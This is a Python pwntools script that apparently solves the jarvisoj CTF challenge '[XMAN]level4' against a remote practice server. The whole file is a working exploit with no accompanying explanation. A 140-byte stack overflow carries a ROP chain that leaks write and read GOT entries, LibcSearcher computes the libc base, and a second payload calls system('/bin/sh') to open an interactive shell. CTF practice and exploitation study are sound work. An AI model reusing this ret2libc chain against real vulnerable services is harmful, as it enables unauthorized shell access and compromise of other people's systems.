from pwn import *
from LibcSearcher import *


def x_man_level4(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/[XMAN]level4'):
    print('[XMAN]level4 start')

    # load
    context(log_level='debug', arch='i386', os='linux')
    target = remote('pwn2.jarvisoj.com', 9880)
    # target = process([file_name])
    target_elf = ELF(file_name)

    # init
    pop_ret_gadget = p32(0x080482f1)  # pop ebx ; ret
    pop3_ret_gadget = p32(0x08048509)  # pop esi ; pop edi ; pop ebp ; ret

    write_elf = p32(target_elf.plt['write'])
    write_got = p32(target_elf.got['write'])
    read_got = p32(target_elf.got['read'])

    vulnerable_func_ptr = p32(target_elf.symbols['vulnerable_function'])

    # payload_1
    payload_1 = b'A' * 140

    # write(1, %write_got, 4u)
    payload_1 += write_elf + pop3_ret_gadget + p32(0x1) + write_got + p32(0x4)
    # write(1, %read_got, 4u)
    payload_1 += write_elf + pop3_ret_gadget + p32(0x1) + read_got + p32(0x4)
    # vulnerable_function()
    payload_1 += vulnerable_func_ptr

    # payload_1 send
    target.sendline(payload_1)

    write_ptr = u32(target.recv(4))
    read_ptr = u32(target.recv(4))
    print('write: %x' % write_ptr)
    print('read: %x' % read_ptr)

    # find function libc address
    searcher = LibcSearcher('write', write_ptr)
    searcher.add_condition('read', read_ptr)
    libc_base = write_ptr - searcher.dump('write')
    system_ptr = p32(libc_base + searcher.dump('system'))
    bin_sh_ptr = p32(libc_base + searcher.dump('str_bin_sh'))

    # payload_2
    payload_2 = b'A' * 140
    # write(1, %read_got, 4u)
    payload_2 += write_elf + pop3_ret_gadget + p32(0x1) + read_got + p32(0x4)
    # system('/bin/sh')
    payload_2 += system_ptr + pop_ret_gadget + bin_sh_ptr

    # payload_2 send
    target.sendline(payload_2)

    # hack
    target.interactive()

    print('[XMAN]level4 end')


if __name__ == '__main__':
    x_man_level4()


